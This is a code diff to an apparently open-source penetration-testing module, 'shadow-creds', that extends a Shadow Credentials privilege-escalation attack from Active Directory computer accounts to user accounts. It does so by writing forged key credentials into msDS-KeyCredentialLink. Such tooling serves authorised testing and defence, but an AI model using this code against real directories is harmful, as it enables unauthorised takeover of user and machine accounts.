@@ -24,13 +24,13 @@ class NXCModule:
     """
 
     name = "shadow-creds"
-    description = "List, add, inspect, remove, backup, or revert Shadow Credentials on a computer"
+    description = "List, add, inspect, remove, backup, or revert Shadow Credentials on a user or computer"
     supported_protocols = ["ldap"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
     def options(self, context, module_options):
         """
-        TARGET      sAMAccountName of the target computer (for example, TARGET=DESKTOP-123456$)
+        TARGET      sAMAccountName of the target user or computer (for example, TARGET=user or TARGET=DESKTOP-123456$)
         ACTION      Action to perform: list, add, info, remove, backup, or revert (default: list)
         DEVICE_ID   KeyCredential device ID; required for info and remove
         JSONFILE    JSON backup path; required for revert and optional for backup
@@ -66,12 +66,12 @@ class NXCModule:
         self.connection = connection
 
         resp = connection.search(
-            searchFilter=f"(&(objectClass=computer)(sAMAccountName={self.target}))",
-            attributes=["distinguishedName", "sAMAccountName", "msDS-KeyCredentialLink"],
+            searchFilter=f"(&(objectClass=user)(sAMAccountName={self.target}))",
+            attributes=["distinguishedName", "sAMAccountName", "objectClass", "msDS-KeyCredentialLink"],
         )
         resp_parsed = parse_result_attributes(resp)
         if not resp_parsed:
-            context.log.fail(f"Computer '{self.target}' was not found")
+            context.log.fail(f"Account '{self.target}' was not found")
             return
 
         target_dn = resp_parsed[0]["distinguishedName"]
@@ -81,7 +81,7 @@ class NXCModule:
         if self.action == "list":
             self.list(self.parse_credentials(raw_values))
         elif self.action == "add":
-            self.add(target_dn)
+            self.add(target_dn, "computer" in resp_parsed[0]["objectClass"])
         elif self.action == "info":
             self.info(self.parse_credentials(raw_values))
         elif self.action == "remove":
@@ -122,7 +122,7 @@ class NXCModule:
         for _, credential in credentials:
             self.context.log.highlight(f"Device ID: {credential.DeviceId.toFormatD().lower() if credential.DeviceId else '<missing>'} | Creation time: {credential.CreationTime}")
 
-    def add(self, target_dn):
+    def add(self, target_dn, is_computer):
         try:
             certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
             credential = KeyCredential.fromX509Certificate2(
@@ -130,7 +130,7 @@ class NXCModule:
                 deviceId=Guid(),
                 owner=target_dn,
                 currentTime=DateTime(),
-                isComputerKey=True,
+                isComputerKey=is_computer,
             )
             device_id = credential.DeviceId.toFormatD().lower()
             ldap_value = credential.toDNWithBinary().toString()
